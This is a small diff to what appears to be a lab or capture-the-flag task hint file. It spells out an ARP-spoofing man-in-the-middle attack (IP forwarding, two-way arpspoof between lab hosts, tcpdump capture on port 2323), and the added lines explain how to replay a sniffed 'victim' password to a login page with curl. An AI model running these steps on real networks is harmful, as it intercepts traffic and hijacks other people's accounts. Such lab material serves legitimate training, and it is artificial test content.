@@ -33,3 +33,7 @@ Hint: start with: sudo sysctl -w net.ipv4.ip_forward=1
   then: sudo arpspoof -i eth0 -t 172.26.0.4 172.26.0.2 &
         sudo arpspoof -i eth0 -t 172.26.0.2 172.26.0.4 &
   then: sudo tcpdump -i eth0 -A -c 300 port 2323 > /tmp/output.txt
+Note: the sniffed password contains a '!' character. In bash, always
+wrap curl -d arguments in SINGLE quotes ('...'), e.g.
+curl -c /tmp/c.jar -d 'username=victim&password=<found-password>' .../login
+otherwise bash eats the ! character ("event not found").
